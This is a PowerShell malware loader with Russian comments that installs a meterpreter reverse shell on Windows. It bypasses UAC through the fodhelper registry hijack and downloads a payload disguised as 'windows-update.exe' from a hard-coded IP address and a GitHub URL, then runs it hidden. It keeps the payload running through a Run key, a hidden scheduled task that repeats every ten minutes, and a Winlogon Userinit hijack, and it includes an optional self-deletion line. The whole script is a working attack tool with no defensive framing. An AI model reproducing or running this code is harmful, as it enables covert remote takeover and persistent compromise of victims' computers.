# win-loader.ps1 - загрузчик и установщик reverse shell для Windows
# Требуется: windows-update.exe (meterpreter)

# === НАСТРОЙКИ ===
$LocalURL = "http://84.39.252.154:8000/windows-update.exe"
$GitHubURL = "https://raw.githubusercontent.com/1VicTim1/1234/main/windows-update.exe"
$PayloadName = "windows-update.exe"
$InstallDir = "$env:ProgramData\Microsoft\Windows\Caches"
$PayloadPath = "$InstallDir\$PayloadName"
# =================

# Функция тихого выполнения
function Invoke-Silent {
    $ErrorActionPreference = 'SilentlyContinue'
    $ProgressPreference = 'SilentlyContinue'
    $VerbosePreference = 'SilentlyContinue'
}

Invoke-Silent

# --- Повышение привилегий до администратора (обход UAC) ---
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Используем технику fodhelper для обхода UAC (работает на многих Windows 10)
    $cmd = "-NoP -Ep Bypass -W Hidden -File `"$PSCommandPath`""
    try {
        $regPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
        New-Item $regPath -Force | Out-Null
        Set-ItemProperty $regPath -Name "(Default)" -Value "powershell.exe $cmd" -Force
        Set-ItemProperty $regPath -Name "DelegateExecute" -Value "" -Force
        Start-Process "fodhelper.exe" -WindowStyle Hidden
        Start-Sleep -Seconds 3
        Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force -EA 0
        exit
    } catch {
        # Если не сработало, выходим
        exit
    }
}

# --- Создание целевой папки ---
if (-not (Test-Path $InstallDir)) {
    New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
}

# --- Функция загрузки файла ---
function Download-File {
    param($url, $path)
    try {
        $wc = New-Object System.Net.WebClient
        $wc.DownloadFile($url, $path)
        return $true
    } catch {
        return $false
    }
}

# --- Загрузка payload (приоритет: локальный сервер -> GitHub) ---
$downloaded = $false
if (Download-File $LocalURL $PayloadPath) {
    $downloaded = $true
} elseif (Download-File $GitHubURL $PayloadPath) {
    $downloaded = $true
}

if (-not $downloaded) {
    exit # Не удалось скачать
}

# --- Запуск payload скрыто ---
Start-Process -FilePath $PayloadPath -WindowStyle Hidden

# --- Добавление в автозагрузку ---

# 1. Реестр (HKCU Run)
$regRun = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regRun -Name "WindowsUpdateSvc" -Value $PayloadPath -Force

# 2. Планировщик задач (каждые 10 минут, скрытая задача)
$taskName = "WindowsUpdateTask"
$action = New-ScheduledTaskAction -Execute $PayloadPath
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10) -RepetitionDuration ([TimeSpan]::MaxValue)
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -Hidden
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null

# 3. Winlogon (если есть права администратора, они уже есть)
$winlogonPath = "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
$userinit = (Get-ItemProperty -Path $winlogonPath -Name Userinit -ErrorAction SilentlyContinue).Userinit
if ($userinit -and ($userinit -notlike "*$PayloadPath*")) {
    Set-ItemProperty -Path $winlogonPath -Name Userinit -Value "$userinit, $PayloadPath" -Force
}

# --- Самоуничтожение скрипта (опционально) ---
# Remove-Item -LiteralPath $MyInvocation.MyCommand.Path -Force
